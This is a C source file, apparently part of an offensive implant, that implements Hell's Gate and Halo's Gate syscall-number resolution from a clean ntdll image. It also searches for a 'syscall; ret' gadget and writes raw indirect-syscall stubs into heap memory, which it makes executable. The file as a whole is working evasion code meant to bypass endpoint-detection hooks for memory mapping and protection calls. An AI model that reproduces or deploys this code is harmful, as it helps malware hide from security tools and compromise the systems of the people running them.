#include "Common.h"
#include "Constexpr.h"

//
// Read the SSN from a clean ntdll stub prologue.
//
FUNC DWORD NaxHellsGate(
    _In_ PBYTE Stub ) {

    if ( !Stub ) return NAX_SC_SSN_INVALID;
    if ( Stub[0] != NAX_NT_PROLOGUE_0 || Stub[1] != NAX_NT_PROLOGUE_1 ||
         Stub[2] != NAX_NT_PROLOGUE_2 || Stub[3] != NAX_NT_PROLOGUE_3 )
        return NAX_SC_SSN_INVALID;

    return *(DWORD*)( Stub + NAX_NT_OFF_SSN );
}

//
// If the target stub is hooked, derive its SSN from a clean neighbor.
// Assumes SSNs are sequential in ntdll export name order.
//
FUNC DWORD NaxHalosGate(
    _In_ PVOID CleanNtdll,
    _In_ ULONG TargetHash ) {

    PBYTE b = B_PTR( CleanNtdll );
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)b;
    PIMAGE_NT_HEADERS nt  = (PIMAGE_NT_HEADERS)( b + dos->e_lfanew );

    DWORD expRva = nt->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ].VirtualAddress;
    if ( !expRva ) return NAX_SC_SSN_INVALID;

    PIMAGE_EXPORT_DIRECTORY exp = (PIMAGE_EXPORT_DIRECTORY)( b + expRva );
    PDWORD names = (PDWORD)( b + exp->AddressOfNames );
    PWORD  ords  = (PWORD)(  b + exp->AddressOfNameOrdinals );
    PDWORD funcs = (PDWORD)( b + exp->AddressOfFunctions );
    DWORD  n     = exp->NumberOfNames;

    DWORD tgt = n;
    for ( DWORD i = 0; i < n; i++ ) {
        if ( HashString( (PCHAR)( b + names[i] ), 0 ) == TargetHash ) {
            tgt = i;
            break;
        }
    }
    if ( tgt == n ) return NAX_SC_SSN_INVALID;

    for ( DWORD d = 1; d < 256; d++ ) {
        for ( INT dir = -1; dir <= 1; dir += 2 ) {
            if ( dir < 0 && tgt < d ) continue;
            if ( dir > 0 && tgt + d >= n ) continue;

            DWORD idx   = ( dir < 0 ) ? ( tgt - d ) : ( tgt + d );
            PBYTE nstub = b + funcs[ ords[ idx ] ];
            DWORD nssn  = NaxHellsGate( nstub );
            if ( nssn == NAX_SC_SSN_INVALID ) continue;

            INT32 delta = (INT32)tgt - (INT32)idx;
            INT32 ssn   = (INT32)nssn + delta;
            if ( ssn < 0 || ssn > 0x2000 ) return NAX_SC_SSN_INVALID;
            return (DWORD)ssn;
        }
    }

    return NAX_SC_SSN_INVALID;
}

//
// Locate a `syscall; ret` gadget anywhere in the clean ntdll .text.
//
FUNC PVOID NaxFindSyscallGadget(
    _In_ PVOID CleanNtdll ) {

    PBYTE b = B_PTR( CleanNtdll );
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)b;
    PIMAGE_NT_HEADERS nt  = (PIMAGE_NT_HEADERS)( b + dos->e_lfanew );

    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION( nt );
    for ( WORD i = 0; i < nt->FileHeader.NumberOfSections; i++ ) {
        if ( !( sec[i].Characteristics & IMAGE_SCN_MEM_EXECUTE ) ) continue;

        PBYTE p   = b + sec[i].VirtualAddress;
        DWORD len = sec[i].Misc.VirtualSize;
        if ( len < 3 ) continue;

        for ( DWORD j = 0; j < len - 2; j++ ) {
            if ( p[j] == NAX_SC_GADGET_BYTE0 &&
                 p[j+1] == NAX_SC_GADGET_BYTE1 &&
                 p[j+2] == NAX_SC_GADGET_BYTE2 ) {
                return (PVOID)( p + j );
            }
        }
    }

    return NULL;
}

//
// Resolve one syscall by hash against the clean ntdll copy and build an
// indirect syscall stub in the provided buffer.
//
FUNC BOOL NaxScResolve(
    _In_  PINSTANCE     Inst,
    _In_  ULONG         Hash,
    _Out_ PNAX_SYSCALL  Out ) {

    PBYTE clean = B_PTR( Inst->Modules.CleanNtdll );
    if ( !clean ) return FALSE;

    PBYTE realStub = B_PTR( LdrFunction( clean, Hash ) );
    if ( !realStub ) return FALSE;

    DWORD ssn = NaxHellsGate( realStub );
    if ( ssn == NAX_SC_SSN_INVALID ) ssn = NaxHalosGate( clean, Hash );
    if ( ssn == NAX_SC_SSN_INVALID ) return FALSE;

    PVOID gadget = NaxFindSyscallGadget( clean );
    if ( !gadget ) return FALSE;

    if ( !Out->Stub ) return FALSE;

    // Build the stub:
    //   mov r10, rcx              ; 4c 8b d1
    //   mov eax, ssn              ; b8 dd dd dd dd
    //   mov r11, gadget           ; 49 bb gg gg gg gg gg gg gg gg
    //   call r11                  ; 41 ff d3
    //   ret                       ; c3
    //   nop * 4                   ; pad to 0x20
    PBYTE s = B_PTR( Out->Stub );
    s[0]  = 0x4c; s[1]  = 0x8b; s[2]  = 0xd1;                       // mov r10, rcx
    s[3]  = 0xb8;
    *(DWORD*)(s + 4) = ssn;                                         // mov eax, ssn
    s[8]  = 0x49; s[9]  = 0xbb;
    *(PVOID*)(s + 10) = gadget;                                      // mov r11, gadget
    s[18] = 0x41; s[19] = 0xff; s[20] = 0xd3;                       // call r11
    s[21] = 0xc3;                                                   // ret
    for ( int i = 22; i < NAX_SC_STUB_SIZE; i++ ) s[i] = 0x90;       // nop padding

    Out->Ssn    = ssn;
    Out->Gadget = gadget;

    return TRUE;
}

//
// Allocate indirect syscall stubs from the heap and resolve the core syscalls.
//
FUNC BOOL NaxScInit(
    _In_ PINSTANCE Inst ) {

    if ( !Inst->Modules.CleanNtdll ) return FALSE;

    // Allocate a contiguous block for all stubs and make it RW then RX.
    SIZE_T stubSize = NAX_SC_STUB_SIZE * NAX_SC_MAX;
    PVOID stubBase  = Inst->Win32.RtlAllocateHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, stubSize );
    if ( !stubBase ) return FALSE;

    // Stubs are written to RW memory first, then flipped to RX.
    ULONG old = 0;
    SIZE_T sz = stubSize;
    if ( !NT_SUCCESS( Inst->Win32.NtProtectVirtualMemory(
            NtCurrentProcess(), &stubBase, &sz, PAGE_READWRITE, &old ) ) ) {
        return FALSE;
    }

    NAX_SYSCALL* table = &Inst->Syscalls.NtOpenSection;
    ULONG hashes[] = {
        HASH_STR("NtOpenSection"),
        HASH_STR("NtMapViewOfSection"),
        HASH_STR("NtUnmapViewOfSection"),
        HASH_STR("NtAllocateVirtualMemory"),
        HASH_STR("NtProtectVirtualMemory"),
        HASH_STR("NtQuerySystemInformation"),
        HASH_STR("NtClose"),
        HASH_STR("LdrLoadDll"),
    };

    UINT32 count = sizeof(hashes) / sizeof(hashes[0]);
    if ( count > NAX_SC_MAX ) count = NAX_SC_MAX;

    for ( UINT32 i = 0; i < count; i++ ) {
        table[i].Stub = B_PTR( stubBase ) + i * NAX_SC_STUB_SIZE;
        if ( !NaxScResolve( Inst, hashes[i], &table[i] ) ) {
            // degrade: leave this slot as NULL, caller must fall back
            table[i].Stub = NULL;
        }
    }

    // Flip stubs to RX
    sz = stubSize;
    Inst->Win32.NtProtectVirtualMemory( NtCurrentProcess(), &stubBase, &sz, PAGE_EXECUTE_READ, &old );

    return TRUE;
}
